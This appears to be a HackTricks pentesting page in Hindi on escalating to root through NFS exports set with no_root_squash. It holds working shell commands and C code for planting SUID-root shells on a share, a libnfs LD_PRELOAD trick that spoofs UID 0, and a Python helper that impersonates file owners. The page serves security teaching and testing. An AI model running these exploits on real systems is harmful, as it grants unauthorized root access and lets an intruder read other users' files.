# NFS No Root Squash Misconfiguration से Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Squashing की बुनियादी जानकारी

NFS AUTH_SYS/AUTH_UNIX के साथ, server हर RPC request में दिए गए `uid` और `gid` के आधार पर file-permission checks करता है। Kerberos जैसे अन्य security flavors अलग credentials का उपयोग करते हैं, और server permissions जाँचने से पहले numeric credentials को map कर सकता है।<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: हर UID और GID को anonymous account पर map करता है, जो Linux पर डिफ़ॉल्ट रूप से `nobody` (65534) होता है। non-root requests के लिए `no_all_squash` डिफ़ॉल्ट है।<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux पर यह डिफ़ॉल्ट है और UID/GID 0 (root) वाली requests को anonymous account पर map करता है; दूसरे UIDs और GIDs को squash नहीं किया जाता।<sup>[[4]](#references)</sup>
- **`no_root_squash`**: root squashing को बंद करता है, इसलिए UID/GID 0 वाली requests को server पर root के रूप में जाँचा जा सकता है।<sup>[[4]](#references)</sup>

अगर किसी allowed client के पास **`/etc/exports`** में **`no_root_squash`** के साथ configured writable export को mount करने की अनुमति है, तो उसकी UID/GID 0 requests वहाँ server के root user के रूप में लिख सकती हैं।<sup>[[4]](#references)</sup>

`root_squash` केवल UID/GID 0 को remap करता है; AUTH_SYS के तहत, किसी permitted client का **nonzero numeric UID/GID** अब भी server पर किसी दूसरे account से match कर सकता है। इसलिए, अगर client उस numeric identity के रूप में file बना सकता है और server access की अनुमति देता है, तो writable export root squashing के बावजूद cross-user path बन सकता है। SUID/SGID handoff के लिए resulting file का owner, executable access, server mount की `nosuid` स्थिति, ACLs और SELinux या अन्य policies भी verify करें। केवल exported pathname, `rw` option या matching number से यह साबित नहीं होता कि client को अनुमति है, export active है, या दोनों hosts में effective identity mapping एक जैसी है। Enumeration के दौरान `/etc/exports` और local metadata को passively inspect करें; कोई नया share mount न करें और test file न बनाएँ।<sup>[[4]](#references)[[5]](#references)</sup>

**NFS** के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

bash का उपयोग करने वाला Option 1:
- किसी allowed client पर, writable export को root के रूप में mount करें, उसमें **`/bin/bash`** copy करें, उसका **SUID** bit set करें और उसे ऐसे victim mount से execute करें जो `nosuid` का उपयोग नहीं करता।<sup>[[2]](#references)[[4]](#references)</sup>
    - Uploaded file का owner root बने रहने के लिए, server में **`no_root_squash`** होना चाहिए। अगर root squashed है, तो किसी दूसरे account के लिए SUID binary तभी संभव है जब client उस account के numeric UID/GID से वैध रूप से file बना या उसका owner बन सकता हो।<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

विकल्प 2: compiled C code का उपयोग करके:
- किसी allowed client से directory को mount करें, SUID permissions का दुरुपयोग करने वाला compiled payload कॉपी करें, उसका **SUID** bit सेट करें और उसे victim से execute करें (कुछ [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) देखें)।
    - पहले जैसी ही restrictions

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> ध्यान दें कि यदि आप अपनी मशीन से victim machine तक **tunnel बना सकते हैं, तो privilege escalation exploit करने के लिए आवश्यक ports को tunnel करके Remote version का उपयोग अब भी कर सकते हैं**।\
> यह तरकीब तब उपयोगी है जब `/etc/exports` में export को victim के IP तक सीमित किया गया हो: remote client इसे mount नहीं कर सकता, लेकिन local technique उस allowed host पर पहले से mounted share के ज़रिए काम कर सकती है।<sup>[[2]](#references)</sup>\
> इस unprivileged libnfs method के लिए, **`/etc/exports`** में export पर `insecure` flag होना चाहिए, ताकि process non-reserved source port का उपयोग कर सके; default रूप से `secure` होता है, हालांकि reserved port bind कर सकने वाले process को इस option की ज़रूरत नहीं होती।<sup>[[1]](#references)[[4]](#references)</sup>

### मूल जानकारी

NFSv3 AUTH_UNIX client हर call में अपना effective UID, GID और groups शामिल करता है, और server permission checks के लिए इनका उपयोग करता है। यह local technique [libnfs](https://github.com/sahlberg/libnfs) के ज़रिए RPC credentials forge करके इस मॉडल का दुरुपयोग करती है; इसका preload module NFS context में UID/GID को override करने का समर्थन करता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Library को compile करना

libnfs example के लिए target kernel के अनुसार बदलाव करने पड़ सकते हैं; यहाँ दिए गए walkthrough में खास तौर पर preload module compile करने से पहले fallocate syscalls को comment out करने का उल्लेख है।<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploit को अंजाम देना

इस उदाहरण में एक छोटा C helper बनाया जाता है जो shell लॉन्च करता है। फिर इसे share पर रखा जाता है और NFS context में UID 0 के साथ `ld_nfs.so` का उपयोग करके इसे SUID-root बनाया जाता है।<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit code compile करें:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **UID को spoof करके exploit को share पर रखें और उसकी permissions बदलें**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **root privileges प्राप्त करने के लिए exploit चलाएँ**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### बोनस: Stealthy File Access के लिए NFShell

Root access मिलने के बाद, यह `nfsh.py` पैटर्न command चलाने से पहले effective UID को target file के UID पर सेट करता है, जिससे ownership को recursively बदले बिना access मिल जाता है।<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

इस तरह चलाएँ:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [एक कम प्रसिद्ध NFS privesc की कहानी](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3 प्रोटोकॉल विनिर्देश](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
